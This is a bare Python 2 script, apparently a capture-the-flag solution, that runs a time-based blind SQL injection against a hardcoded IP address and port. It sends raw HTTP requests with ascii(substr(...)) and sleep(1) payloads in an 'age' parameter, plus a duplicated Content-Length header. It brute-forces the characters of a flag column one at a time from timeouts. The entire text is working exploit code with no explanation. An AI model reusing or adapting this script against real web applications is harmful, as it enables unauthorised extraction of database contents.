import socket
import time
import os

url = "111.186.57.61"
port = 10601
flag = ""

for i in range(1,50):
    for j in range(44,128):
        s = socket.socket()
        s.connect((url, port))
        s.settimeout(3)
        data = "GET /?age=1%20or%201%20and%20ascii(substr((select%20flag_32122%20from%20flag_xdd),"+str(i)+",1))="+str(j)+"%20and%20sleep(1) HTTP/1.1\r\nHost:111.186.57.61:10601\r\nConnection:close\r\nContent-Length:0\r\nContent-Length:0\r\n\r\n"
        #print data
        s.send(data)
        try:
            os.system('clear')
            print chr(j)
            print flag
            s.recv(1024)
            s.close()
        except:
            flag += chr(j)
            s.close()
            break